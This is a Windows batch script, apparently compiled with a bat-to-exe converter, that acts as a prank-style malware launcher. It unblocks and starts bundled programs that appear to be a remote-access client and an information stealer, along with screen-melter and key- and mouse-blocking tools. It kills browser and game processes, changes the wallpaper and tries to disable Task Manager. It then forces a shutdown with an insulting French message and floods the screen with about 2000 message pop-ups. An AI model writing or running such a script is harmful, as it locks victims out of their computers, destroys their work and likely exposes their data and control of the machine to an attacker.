::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGmW+0UiKRYUag2OOXiGMr0ZqM70/e+Utg0LBaxuKs+TiP3ObaAw5VXtcKoZ3n8avsQeCQhMQiajayk7u2tRoljLJdSOsDPIaWen2hp+EmZ75w==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJlZk0aGUrRaDjoUtU=
::ZQ05rAF9IBncCkqN+0xwdVsBAlLMaSXrVu1Osbirjw==
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGmW+0UiKRYUag2OOXiGMr0ZqM70/e+Utg0LBaxuKs+TiP3ObaAw5VXtcKoZ3n8avsQeCQhMQiajayk7u2tRoiqAL8L8
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
powershell -Command "Unblock-File -Path '%~dp0ressources\XClient.exe'"
powershell -Command "Unblock-File -Path '%~dp0ressources\Exela.exe'"
powershell -Command "Unblock-File -Path '%~dp0ressources\Block Alt + F4.exe'"
powershell -Command "Unblock-File -Path '%~dp0ressources\screen-melter.exe'"
powershell -Command "Unblock-File -Path '%~dp0ressources\Invers Mouse Click.exe'"
powershell -Command "Unblock-File -Path '%~dp0ressources\Block Mouse Mouvement.exe'"
powershell -Command "Unblock-File -Path '%~dp0ressources\Block Windows Key.exe'"
powershell -Command "Unblock-File -Path '%~dp0ressources\Block Alt + Tab.exe'"
powershell -Command "Unblock-File -Path '%~dp0ressources\voice.vbs'"
powershell -Command "Unblock-File -Path '%~dp0ressources\music.vbs'"
powershell -Command "Unblock-File -Path '%~dp0ressources\msg.vbs'"
powershell -Command "Unblock-File -Path '%~dp0ressources\error.vbs'"
powershell -Command "Unblock-File -Path '%~dp0ressources\icon.bmp'"
taskkill /f /im spotify.exe
reg add "HKCU\Control Panel\Desktop" /V Wallpaper /F /T REG_SZ /D "C:\Users\%username%\risi.bmp"
%SystemRoot%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f 
reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "C:\Users\%username%\risi.bmp" /f 
reg delete "HKCU\Software\Microsoft\Internet Explorer\Desktop\General" /v WallpaperStyle /f
reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem  v  DisableTaskMgr  t REG_DWORD  d 1 f
start "" "%~dp0ressources\Exela.exe"
start "" "%~dp0ressources\XClient.exe"
start "" "%~dp0ressources\Block Alt + F4.exe"
start "" "%~dp0ressources\Block Alt + Tab.exe"
start "" "%~dp0ressources\screen-melter.exe"
start "" "%~dp0ressources\voice.vbs"
start "" "%~dp0ressources\Invers Mouse Click.exe"
start "" "%~dp0ressources\Block Windows Key.exe"
start "" "%~dp0ressources\icon.bmp"
copy "risi.bmp" "C:\Users\%username%\" 
timeout /t 1
ping 127.0.0.1 -n 1 -w 500 > nul
taskkill /f /im chrome.exe
taskkill /f /im javaw.exe
taskkill /f /im hl2.exe
start "" "%~dp0ressources\music.vbs"
start "" "%~dp0ressources\msg.vbs"
start "" "%~dp0ressources\error.vbs"
shutdown -s -t 300 -c "Dans 5 minutes tu n'as plus de PC fils de pute :)"
for /L %%i in (1,1,1000) do (
    start "" "%~dp0ressources\msg.vbs"
    start "" "%~dp0ressources\error.vbs"
)